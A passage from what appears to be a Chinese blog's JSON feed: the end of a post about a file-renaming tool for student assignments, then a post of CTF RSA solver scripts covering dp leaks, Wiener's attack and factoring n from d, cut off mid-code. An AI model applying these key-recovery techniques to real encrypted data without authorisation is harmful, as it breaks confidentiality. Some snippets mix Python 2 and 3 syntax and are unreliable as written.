class=\"token keyword\">elif</span> <span class=\"token string\">'.xls'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.xls\"</span></span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.c'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.c\"</span></span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.cpp'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.cpp\"</span></span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.py'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.py\"</span></span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.java'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.java\"</span></span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.txt'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.txt\"</span></span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.rtf'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.rtf\"</span></span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.ppt'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.ppt\"</span></span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.img'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.img\"</span></span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.doc'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.doc\"</span></span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">elif</span> <span class=\"token string\">'.png'</span> <span class=\"token keyword\">in</span> temp_file<span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\t\t\t\t\t\tnew_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.png\"</span></span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span> new_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>tnew_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>form<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t\t\t\t\t<span class=\"token keyword\">if</span> temp_excel2 <span class=\"token keyword\">in</span> temp_file <span class=\"token keyword\">or</span> temp_excel3 <span class=\"token keyword\">in</span> temp_file <span class=\"token keyword\">or</span> temp_excel1 <span class=\"token keyword\">in</span> temp_file <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\t\t\t\t\t\tos<span class=\"token punctuation\">.</span>chdir<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\t\t\t\t\t\tos<span class=\"token punctuation\">.</span>rename<span class=\"token punctuation\">(</span>temp_file<span class=\"token punctuation\">,</span>new_file<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t\t\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr></table></figure><h1 id=\"instructions\"><a class=\"anchor\" href=\"#instructions\">#</a> Instructions</h1>\n<p>由于工具过于简单，参考下面的截图即可（Running screenshot）</p>\n<p>若有使用上的其他问题，请留言！</p>\n<h1 id=\"running-screenshot\"><a class=\"anchor\" href=\"#running-screenshot\">#</a> Running screenshot</h1>\n<p><strong>1. 主界面运行图</strong></p>\n<p><img data-src=\"https://i.loli.net/2021/12/01/IA1tHYBqSLfeCOj.png\" alt=\"1.png\"></p>\n<p><strong>2. 查找结果运行图</strong></p>\n<p>略</p>\n<p><strong>3. 格式化命名界面运行图</strong></p>\n<p><img data-src=\"https://i.loli.net/2021/12/01/T9AUljhp2Mztqa3.png\" alt=\"3.png\"></p>\n<p><strong>4. 格式化命名自定义填法示例：均不是必填项</strong></p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMTIvMDEvelF0cWZIZDk1NDhlUmhLLnBuZw==\">https://i.loli.net/2021/12/01/zQtqfHd9548eRhK.png</span>&quot; alt=&quot;4.png&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n<p><strong>5. 备份确认图</strong></p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMTIvMDEvekRCckk2UTdiRmhjc1VOLnBuZw==\">https://i.loli.net/2021/12/01/zDBrI6Q7bFhcsUN.png</span>&quot; alt=&quot;5.png&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n<p><strong>6. 修改确认图</strong></p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMTIvMDEvdFZuT2lDWXBicU5vRGxQLnBuZw==\">https://i.loli.net/2021/12/01/tVnOiCYpbqNoDlP.png</span>&quot; alt=&quot;6.png&quot; style=&quot;zoom: 67%;&quot; /&gt;</p>\n<h1 id=\"update-log\"><a class=\"anchor\" href=\"#update-log\">#</a> Update log</h1>\n<div class=\"note default\">\n<p>日志记录了该工具各个版本的更新和坎坷历程，由于忘了日期，我就大概一记，您就看个乐呵吧 hhh</p>\n</div>\n<p>v0.0.1</p>\n<ul>\n<li>完成了查找功能</li>\n</ul>\n<p>v0.0.2</p>\n<ul>\n<li>完成了改名功能</li>\n<li>完善了查找功能</li>\n</ul>\n<p>v0.0.3</p>\n<ul>\n<li>测试出了 bug，找到了替代方法，但并没有完全修复</li>\n</ul>\n<p>v0.0.4</p>\n<ul>\n<li>改进 excel 表格，减少了部分无关代码</li>\n</ul>\n<p>v0.0.5</p>\n<ul>\n<li>区分了民族学生的名字简和全称，区分了民汉</li>\n<li>修改了两个功能的代码</li>\n</ul>\n<p>v0.0.6</p>\n<ul>\n<li><strong>改变了工具的定位方向</strong></li>\n<li>增加了文件查找功能</li>\n</ul>\n<p>v0.1.0</p>\n<ul>\n<li>扩展了巨多功能（不介绍了）</li>\n</ul>\n<p>v0.2.0-0.8.8</p>\n<ul>\n<li>无关功能修改</li>\n</ul>\n<p>v0.9.0</p>\n<ul>\n<li>增加了图像化 GUI 界面，完善了所有功能的图像化操作</li>\n</ul>\n<p>v0.9.2</p>\n<ul>\n<li>剥离了其他功能，单独取出了查缺和重命名功能</li>\n<li>为其制作了新的 GUI 界面</li>\n</ul>\n<p>v0.9.4</p>\n<ul>\n<li>增加了自定义班级输入功能</li>\n</ul>\n<p>v0.9.6</p>\n<ul>\n<li>增加了格式强制修改功能</li>\n<li>提供了文件备份选项</li>\n</ul>\n<p>v0.9.8</p>\n<ul>\n<li>增加了自定义格式功能</li>\n<li>优化上一版本</li>\n</ul>\n<p>v1.0.0</p>\n<ul>\n<li>对所有功能进行了检测</li>\n<li>优化了部分代码</li>\n<li>确定了新的改善方向</li>\n<li>更新至 github 仓库</li>\n</ul>\n<h1 id=\"shortbug\"><a class=\"anchor\" href=\"#shortbug\">#</a> Short&amp;Bug</h1>\n<p>经过测试，软件还有 bug 没有修复，不过大部分情况都可正常使用。</p>\n<p>并且在改格式前可以提供备份选项，建议备份以防出错！</p>\n<p><strong>请自检名单是否有下列情况：</strong></p>\n<hr>\n<p>下面列出已知 bug：</p>\n<ul>\n<li>重名 bug：当有重名时会导致代码运行出错，致使失败</li>\n</ul>\n<p>这里提供三种解决方法：</p>\n<ol>\n<li>操作前选择备份文件（软件会提示是否备份），防止意外</li>\n<li>提前移出重名</li>\n<li>源文件用学号命名，进行判断时可以绕过重名</li>\n</ol>\n<ul>\n<li>名字中包含另一人的名字，如  <code>小明</code>  和  <code>王小明</code> ，导致代码错误，运行失败</li>\n</ul>\n<p>解决方法：</p>\n<p>​\t\t同上</p>\n<hr>\n<p>如果遇到其他 bug 可以留言与我反应～</p>\n<p>以上 bug 预计下次更新解决～～～（有时间再说）</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "http://example.com/2021/11/30/ctf/crypto&misc/cryptotal/RSA%E8%84%9A%E6%9C%AC/",
            "url": "http://example.com/2021/11/30/ctf/crypto&misc/cryptotal/RSA%E8%84%9A%E6%9C%AC/",
            "title": "RSA脚本",
            "date_published": "2021-11-30T09:28:09.178Z",
            "content_html": "<h1 id=\"epqc\"><a class=\"anchor\" href=\"#epqc\">#</a> e,p,q,c</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2 <span class=\"token keyword\">as</span> gp</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span>  gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q <span class=\"token operator\">=</span>  gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span>  gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span>  gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>d <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"endpc\"><a class=\"anchor\" href=\"#endpc\">#</a> e,n,dp,c</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2 <span class=\"token keyword\">as</span> gp</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>e <span class=\"token operator\">=</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>dp <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">*</span>dp<span class=\"token operator\">%</span>x<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        p<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">*</span>dp<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>x<span class=\"token operator\">+</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">%</span>p<span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        q<span class=\"token operator\">=</span>n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        phin<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        d<span class=\"token operator\">=</span>gp<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> phin<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        m<span class=\"token operator\">=</span>gp<span class=\"token punctuation\">.</span>powmod<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pqdpdqc\"><a class=\"anchor\" href=\"#pqdpdqc\">#</a> p,q,dp,dq,c</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2 <span class=\"token keyword\">as</span> gp</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>dp <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>dq <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>mpz<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>phin <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>dd <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>d<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>dp<span class=\"token operator\">-</span>dq<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>dd <span class=\"token operator\">*</span> gp<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>dd<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>dd<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>dq</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>m <span class=\"token operator\">=</span> gp<span class=\"token punctuation\">.</span>powmod<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'-------------------'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"nee长度较大\"><a class=\"anchor\" href=\"#nee长度较大\">#</a> n,e（e 长度较大）</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span>  RSAwienerHacker</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>n<span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>e<span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>d <span class=\"token operator\">=</span>  RSAwienerHacker<span class=\"token punctuation\">.</span>hack_RSA<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> d<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"flag&#123;\"</span> <span class=\"token operator\">+</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"&#125;\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span> flag</pre></td></tr></table></figure><h1 id=\"pqe求d\"><a class=\"anchor\" href=\"#pqe求d\">#</a> p,q,e 求 d</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util <span class=\"token keyword\">import</span> number</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">473398607161</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">4511491</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">17</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span> <span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ned求pq\"><a class=\"anchor\" href=\"#ned求pq\">#</a> n,e,d 求 p,q</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> next_prime<span class=\"token punctuation\">,</span> gcd</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Factorize</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    g <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        k <span class=\"token operator\">=</span> e <span class=\"token operator\">*</span> d <span class=\"token operator\">-</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token keyword\">not</span> k <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            k <span class=\"token operator\">//=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td 